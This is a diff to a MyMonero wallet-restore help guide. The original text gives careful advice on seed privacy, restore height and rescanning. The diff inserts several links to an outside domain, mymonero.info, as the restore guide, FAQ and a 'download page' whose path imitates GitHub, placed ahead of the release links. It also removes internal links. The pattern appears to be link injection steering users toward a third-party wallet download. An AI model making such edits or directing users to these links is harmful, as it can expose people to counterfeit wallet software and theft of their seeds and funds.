@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Restore a wallet by entering its valid recovery seed into a wallet that supports that seed format, then let the wallet scan from an appropriate restore height. Keep the seed private throughout; anyone who obtains it may control the funds.
 
+
+The MyMonero.info site covers this in its [MyMonero restore wallet guide](https://mymonero.info/restore-mymonero-wallet). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.
+
 ## You'll see this if
 - You installed MyMonero again or moved to a different device.
 - Your wallet list is empty, or you need to access an existing wallet.
@@ -42,8 +45,8 @@ A wallet may need to rescan blockchain history after restoration. Restore height
 5. **Check for entry mistakes locally.** If restoration rejects the seed, review your own written backup for legible spelling, word order, spacing, and count. Do not post individual words for public troubleshooting. For format-specific checks, see [MyMonero seed not accepted](./mymonero-seed-not-accepted.md).
 6. **Set the restore height carefully.** If the wallet asks for a restore height and you know when the wallet was first used, choose a suitable starting point according to the wallet's guidance. If uncertain, use an earlier height rather than a later one. Earlier scanning is more complete but slower. A scan beginning too late can make old activity appear absent.
 7. **Allow scanning to finish.** Keep the application open and online as needed while it checks history. A restored wallet can take time to show current activity. Avoid interpreting an incomplete scan as proof that funds are gone.
-8. **Verify the result.** Confirm that the wallet address and history correspond to the wallet you intended to restore. Check incoming and outgoing transactions and distinguish total funds from locked or pending funds. Use [MyMonero balance shows zero](./mymonero-balance-shows-zero.md) if the displayed amount seems wrong.
-9. **Protect the restored access.** Store the seed privately offline and secure the device. Do not send funds until you have checked the recipient, amount, and available balance. If you later move all funds, understand [sweeping funds to a new wallet](./mymonero-sweep-funds-new-wallet.md) first.
+8. **Verify the result.** Confirm that the wallet address and history correspond to the wallet you intended to restore. Check incoming and outgoing transactions and distinguish total funds from locked or pending funds. Use MyMonero balance shows zero if the displayed amount seems wrong.
+9. **Protect the restored access.** Store the seed privately offline and secure the device. Do not send funds until you have checked the recipient, amount, and available balance. If you later move all funds, understand sweeping funds to a new wallet first.
 
 > [!TIP]
 > Restore height is a scan starting point, not a new wallet password. Choosing an earlier point can take longer, but may help include older wallet activity.
@@ -52,7 +55,7 @@ A wallet may need to rescan blockchain history after restoration. Restore height
 ## If that did not work
 If the wallet says the seed is invalid, do not keep trying random word substitutions. Confirm whether the seed has 13 or 25 words and whether the wallet's restore method supports that exact format. Check the original backup carefully on your own. The behavior of recovery when a word is missing is not something to assume; never share partial seed words to ask strangers to reconstruct them.
 
-If the wallet opens but has no visible transactions, it may still be scanning or may have started from a restore height that is too recent. Review the height and scan status, and consult [MyMonero transaction not showing](./mymonero-transaction-not-showing.md) and MyMonero not syncing. A server connection issue can affect scanning; error 523 is general guidance that the server connection is unavailable, not proof that the seed or funds are invalid.
+If the wallet opens but has no visible transactions, it may still be scanning or may have started from a restore height that is too recent. Review the height and scan status, and consult MyMonero transaction not showing and MyMonero not syncing. A server connection issue can affect scanning; error 523 is general guidance that the server connection is unavailable, not proof that the seed or funds are invalid.
 
 The old MyMonero web wallet login is no longer available. Be cautious of anyone claiming to restore it through a replacement web login. If concerned about your seed's safety, do not disclose it; consider using a trusted wallet option and your own judgment about moving funds. For facts about the app's status, read MyMonero shutdown facts.
 
@@ -93,6 +96,7 @@ No. Never share your seed. Nobody legitimate should ask for it; a person with th
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
